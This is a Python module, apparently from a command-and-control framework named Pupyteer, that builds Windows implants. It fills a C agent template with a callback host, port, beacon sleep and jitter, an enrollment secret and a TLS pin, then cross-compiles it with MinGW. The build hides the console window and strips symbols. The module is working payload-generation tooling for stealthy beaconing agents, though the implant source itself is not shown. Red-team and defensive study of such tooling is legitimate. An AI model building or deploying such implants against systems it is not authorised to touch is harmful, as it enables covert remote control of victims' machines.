#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PE Builder — MinGW cross-compilation pipeline for Pupyteer.

Generates and compiles a Windows PE executable from the C agent stub
template, using MinGW (x86_64-w64-mingw32-gcc) on Linux.

Usage
-----
>>> builder = PEBuilder(config, audit)
>>> result = await builder.build(stub_config, output_path)
>>> print(result["artifact_path"], result["hash_sha256"])
"""
from __future__ import annotations

import hashlib
import logging
import os
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Optional

from pupyteer.agent.core.stub import StubConfig

logger = logging.getLogger("pupyteer.payloads.pe_builder")


# --------------------------------------------------------------------------- #
#  Template placeholders (defined in pe_template.c)
# --------------------------------------------------------------------------- #:
# Every one of these has to appear in the template: a placeholder the renderer
# stops filling is a value the built agent silently never learns, which is how
# this template ended up shipping without an enrollment secret or a beacon token
# while the listener had been requiring both.
TEMPLATE_PLACEHOLDERS = (
    "{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}", "{{AUTH}}",
    "{{TLS}}", "{{TLS_FINGERPRINT}}",
)

#: Rendered into a C string literal, so anything that could end the literal
#: early or start an escape has to be refused rather than compiled in.
_C_UNSAFE = frozenset('"\\') | frozenset(chr(c) for c in range(0x20))

#: A pin is sixty-four hex digits and nothing else. Anything else in the source
#: means the build was handed something other than a certificate fingerprint,
#: and the agent would carry a value it can never compare equal to.
_FINGERPRINT_RE = re.compile(r"^[0-9a-f]{64}$")

#: What a template still asks for after rendering.
_PLACEHOLDER_RE = re.compile(r"\{\{[A-Z_]+\}\}")

# Default MinGW compiler
DEFAULT_MINGW_PATH = "x86_64-w64-mingw32-gcc"


@dataclass
class PEBuildResult:
    """Result of a PE build attempt."""
    artifact_path: str = ""
    hash_sha256: str = ""
    status: str = "configured"   # configured | building | built | failed
    error_message: str = ""
    size_bytes: int = 0
    build_timestamp: str = ""
    compiler_used: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "artifact_path": self.artifact_path,
            "hash_sha256": self.hash_sha256,
            "status": self.status,
            "error_message": self.error_message,
            "size_bytes": self.size_bytes,
            "build_timestamp": self.build_timestamp,
            "compiler_used": self.compiler_used,
        }


class PEBuilder:
    """
    Builds Windows PE executables via MinGW cross-compilation.

    Pipeline:
        1. Read C template from pupyteer/agent/core/pe_template.c
        2. Replace placeholders with StubConfig values
        3. Write temporary .c file
        4. Invoke MinGW compiler
        5. Move artifact to target location
        6. Compute hash, return result
    """

    def __init__(
        self,
        config: Any,
        audit: Any,
        *,
        template_path: Optional[str] = None,
    ):
        self._config = config
        self._audit = audit
        self._mingw_path = config.get("payloads.mingw_path", DEFAULT_MINGW_PATH)
        self._template_path = Path(template_path) if template_path else None

    # -- public API -------------------------------------------------------- #

    async def build(
        self,
        stub_cfg: StubConfig,
        output_path: Path,
    ) -> PEBuildResult:
        """
        Build a PE executable from the given StubConfig.

        Args:
            stub_cfg: Agent configuration (host, port, sleep, jitter, etc.)
            output_path: Final path where the .exe should be placed.

        Returns:
            PEBuildResult with artifact path, hash, status, and error info.
        """
        result = PEBuildResult(status="building")
        result.compiler_used = self._mingw_path
        tmp_c_path: Optional[Path] = None
        tmp_dir: Optional[tempfile.TemporaryDirectory] = None

        try:
            # 1. Resolve compiler path
            compiler = self._resolve_compiler()
            if not compiler:
                result.status = "failed"
                result.error_message = (
                    f"MinGW compiler not found: {self._mingw_path}. "
                    f"Install mingw-w64 or set payloads.mingw_path."
                )
                logger.error(result.error_message)
                self._audit.log_event(
                    "pe_build_failed",
                    {"error": result.error_message},
                    result="error",
                )
                return result

            # 2. Load template
            template = self._load_template()

            # 3. Render C source
            source = self._render(template, stub_cfg)

            # 4. Write temp .c file
            tmp_dir = tempfile.TemporaryDirectory(prefix="pupyteer_pe_")
            tmp_c_path = Path(tmp_dir.name) / f"{stub_cfg.name or 'agent'}.c"
            tmp_c_path.write_text(source, encoding="utf-8")

            # 5. Compile
            tmp_exe_path = Path(tmp_dir.name) / f"{stub_cfg.name or 'agent'}.exe"
            compile_ok, compile_err = self._compile(compiler, tmp_c_path, tmp_exe_path)
            if not compile_ok:
                result.status = "failed"
                result.error_message = compile_err
                logger.error("MinGW compilation failed: %s", compile_err)
                self._audit.log_event(
                    "pe_build_failed",
                    {"error": compile_err},
                    result="error",
                )
                return result

            # 6. Move artifact to final destination
            output_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.move(str(tmp_exe_path), str(output_path))

            # 7. Compute hashes
            sha256 = self._hash_file(output_path)
            result.artifact_path = str(output_path)
            result.hash_sha256 = sha256
            result.size_bytes = output_path.stat().st_size
            result.status = "built"
            result.build_timestamp = datetime.now(timezone.utc).isoformat()

            self._audit.log_event(
                "pe_built",
                {
                    "artifact_path": str(output_path),
                    "hash_sha256": sha256[:16] + "...",
                    "size_bytes": result.size_bytes,
                },
                result="success",
            )
            logger.info(
                "PE built successfully: %s (%d bytes, sha256=%s...)",
                output_path,
                result.size_bytes,
                sha256[:12],
            )
            return result

        except Exception as e:
            result.status = "failed"
            result.error_message = str(e)
            logger.exception("PE build failed with exception: %s", e)
            self._audit.log_event(
                "pe_build_failed",
                {"error": str(e)},
                result="error",
            )
            return result
        finally:
            if tmp_dir is not None:
                tmp_dir.cleanup()

    # -- helpers ----------------------------------------------------------- #

    def _resolve_compiler(self) -> Optional[str]:
        """Return the full path to the MinGW compiler, or None."""
        # Check if it's directly callable
        if shutil.which(self._mingw_path):
            return self._mingw_path
        # Try common alternative locations
        alternatives = [
            "/usr/bin/x86_64-w64-mingw32-gcc",
            "/usr/local/bin/x86_64-w64-mingw32-gcc",
            "/usr/bin/mingw64-gcc",
        ]
        for alt in alternatives:
            if Path(alt).exists():
                return alt
        return None

    def _load_template(self) -> str:
        """Read the C agent template."""
        if self._template_path is None:
            # Default: relative to this file. pe_builder.py sits in
            # pupyteer/payloads/, so two parents, not three — a level too many
            # and the path points outside the package, which is a build that
            # cannot find its own template on any install.
            tpl = (
                Path(__file__).resolve().parent.parent
                / "agent"
                / "core"
                / "pe_template.c"
            )
        else:
            tpl = self._template_path

        if not tpl.exists():
            raise FileNotFoundError(f"PE template not found: {tpl}")
        return tpl.read_text(encoding="utf-8")

    def _render(self, template: str, cfg: StubConfig) -> str:
        """Fill the template from the build config, or refuse to build.

        Both ways this fails have to be errors rather than a compiled artifact.
        A placeholder the template stopped carrying means the agent ships
        without a value the listener requires, and it fails on the target
        instead of here — which is precisely how this template came to omit the
        enrollment secret and the beacon token. A value that cannot sit in a C
        string literal would either break the compile or, worse, end the literal
        early and compile something other than what was configured.
        """
        missing = [p for p in TEMPLATE_PLACEHOLDERS if p not in template]
        if missing:
            raise RuntimeError(
                f"PE template no longer carries {missing}; it cannot be given "
                f"{cfg.name or 'this'}'s build settings, and building it anyway "
                "would produce an agent the listener refuses")

        replacements = {
            "{{HOST}}": self._c_string("server host", cfg.host or "127.0.0.1"),
            "{{PORT}}": str(self._c_int("port", cfg.port)),
            "{{SLEEP}}": str(self._c_int("sleep", cfg.sleep)),
            "{{JITTER}}": str(self._c_int("jitter", cfg.jitter)),
            # Empty is legitimate here and only here: it is what the builder
            # resolves when the server runs with agent_auth off, and the
            # listener accepts an empty secret exactly when it is disabled.
            # What is never legitimate is a secret that can end its own C string
            # literal — that is an operator-controlled file, not a generated one.
            "{{AUTH}}": self._c_string("enrollment secret", cfg.auth_secret or ""),
            "{{TLS}}": "1" if cfg.tls else "0",
            "{{TLS_FINGERPRINT}}": self._pin_for(cfg),
        }
        src = template
        for placeholder, value in replacements.items():
            src = src.replace(placeholder, value)

        unfilled = sorted(set(_PLACEHOLDER_RE.findall(src)))
        if unfilled:
            raise RuntimeError(
                f"PE template has placeholders nothing fills: {unfilled}")
        return src

    @staticmethod
    def _pin_for(cfg: StubConfig) -> str:
        """The SHA-256 the compiled agent will pin, from the certificate it meets.

        Refusing here is the point of the check: an agent built for a TLS
        listener with nothing to pin either dies on the target — the template
        rejects an empty pin rather than accept any certificate — or has to be
        built to accept any certificate, which is a stranger with extra steps.
        """
        if not cfg.tls:
            return ""
        if not cfg.tls_cert_pem:
            raise RuntimeError(
                f"cannot build {cfg.name or 'this'} for a TLS listener: no "
                "listener certificate was resolved to pin")
        from pupyteer.server.core.tls import fingerprint_from_pem

        try:
            pin = fingerprint_from_pem(cfg.tls_cert_pem.encode("ascii"))
        except Exception as e:
            raise RuntimeError(
                f"the listener certificate cannot be pinned: {e}") from None
        if not _FINGERPRINT_RE.match(pin):
            raise RuntimeError(f"unexpected certificate fingerprint: {pin!r}")
        return pin

    @staticmethod
    def _c_string(field: str, value: str) -> str:
        """A config value that is safe to compile into a C string literal."""
        bad = sorted({ch for ch in value if ch in _C_UNSAFE})
        if bad:
            raise ValueError(
                f"{field} cannot be compiled into a payload: it contains "
                f"{[repr(ch) for ch in bad]}")
        return value

    @staticmethod
    def _c_int(field: str, value: Any) -> int:
        try:
            number = int(value)
        except (TypeError, ValueError):
            raise ValueError(f"{field} must be a number, got {value!r}") from None
        if not 0 <= number <= 2 ** 31 - 1:
            raise ValueError(f"{field} out of range for the agent: {number}")
        return number

    def _compile(
        self,
        compiler: str,
        src_path: Path,
        out_path: Path,
    ) -> tuple[bool, str]:
        """Invoke MinGW to compile source into PE exe. Returns (ok, error_msg)."""
        cmd = [
            compiler,
            "-o", str(out_path),
            str(src_path),
            # The template's TLS path is Schannel, whose declarations only exist
            # when the header is told to describe the user-mode SSPI; without it
            # MinGW's own sspi.h refuses to compile at all.
            "-DSECURITY_WIN32",
            "-lws2_32",
            "-lsecur32",      # InitSecurityInterface / the SSPI calls
            "-lcrypt32",      # hashing the pinned certificate
            "-O2",            # optimize for size
            "-mwindows",      # GUI subsystem (no console)
            "-s",             # strip symbols
        ]
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
            )
            if proc.returncode != 0:
                err = proc.stderr.strip() or proc.stdout.strip() or f"exit {proc.returncode}"
                return False, err
            return True, ""
        except subprocess.TimeoutExpired:
            return False, "compilation timed out (60s)"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def _hash_file(path: Path) -> str:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            while True:
                chunk = f.read(8192)
                if not chunk:
                    break
                h.update(chunk)
        return h.hexdigest()
